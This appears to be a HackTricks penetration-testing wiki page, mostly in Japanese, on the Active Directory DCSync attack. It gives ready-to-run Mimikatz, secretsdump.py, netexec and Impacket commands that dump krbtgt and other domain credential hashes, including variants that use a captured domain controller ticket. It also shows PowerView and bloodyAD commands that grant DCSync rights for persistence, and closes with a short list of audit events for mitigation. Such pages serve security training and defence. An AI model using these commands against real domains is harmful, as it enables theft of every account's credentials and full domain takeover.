# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 権限は、ドメイン自体に対して次の権限を持つことを意味します: **DS-Replication-Get-Changes**、**Replicating Directory Changes All**、**Replicating Directory Changes In Filtered Set**。

**DCSync に関する重要な注意点:**

- **DCSync 攻撃は Domain Controller の動作をシミュレートし、他の Domain Controller に Directory Replication Service Remote Protocol (MS-DRSR) を使って情報の複製を要求します**。MS-DRSR は Active Directory の正当かつ必要な機能であるため、無効化や停止はできません。
- デフォルトでは、必要な権限を持つのは **Domain Admins、Enterprise Admins、Administrators、Domain Controllers** グループのみです。
- 実際には、**完全な DCSync** にはドメインの naming context に対する **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** が必要です。`DS-Replication-Get-Changes-In-Filtered-Set` は通常それらと一緒に委任されますが、単独では full krbtgt dump よりも、**confidential / RODC-filtered attributes**（たとえば legacy LAPS-style secrets）を同期する場合により重要です。
- いずれかのアカウントのパスワードが reversible encryption で保存されている場合、Mimikatz にはパスワードを clear text で返すオプションがあります

### Enumeration

`powerview` を使って、これらの権限を持つユーザーを確認します:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync 権限を持つ **non-default principals** に注目したい場合は、組み込みの replication-capable groups を除外し、予期しない trustees のみを確認してください:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### ローカルで Exploit する
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでExploitする
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
実践的なスコープ付きの例:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### キャプチャした DC マシン TGT (ccache) を使った DCSync

unconstrained-delegation の export-mode シナリオでは、Domain Controller マシンの TGT（例: `DC1$@DOMAIN` の `krbtgt@DOMAIN`）をキャプチャできる場合があります。その ccache を使って DC として認証し、パスワードなしで DCSync を実行できます。
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. If the environment enforces **SPN target name validation**, a full dump may fail with `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In that case, either request a **`cifs/<dc>`** service ticket for the target DC first or fall back to **`-just-dc-user`** for the account you need immediately.
- When you only have lower replication rights, LDAP/DirSync-style syncing can still expose **confidential** or **RODC-filtered** attributes (for example legacy `ms-Mcs-AdmPwd`) without a full krbtgt replication.

`-just-dc` generates 3 files:

- one with the **NTLM hashes**
- one with the the **Kerberos keys**
- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linuxオペレーターは `bloodyAD` でも同じことができます:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
その後、**ユーザーが正しく割り当てられたかを確認**できます。出力内でそれらを探してください（"ObjectType" フィールド内に権限の名前が表示されるはずです）：
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 緩和策

- Security Event ID 4662 (Audit Policy for object must be enabled) – オブジェクトに対して操作が実行された
- Security Event ID 5136 (Audit Policy for object must be enabled) – ディレクトリサービスオブジェクトが変更された
- Security Event ID 4670 (Audit Policy for object must be enabled) – オブジェクトの権限が変更された
- AD ACL Scanner - ACL の作成と比較レポートを作成。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考文献

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
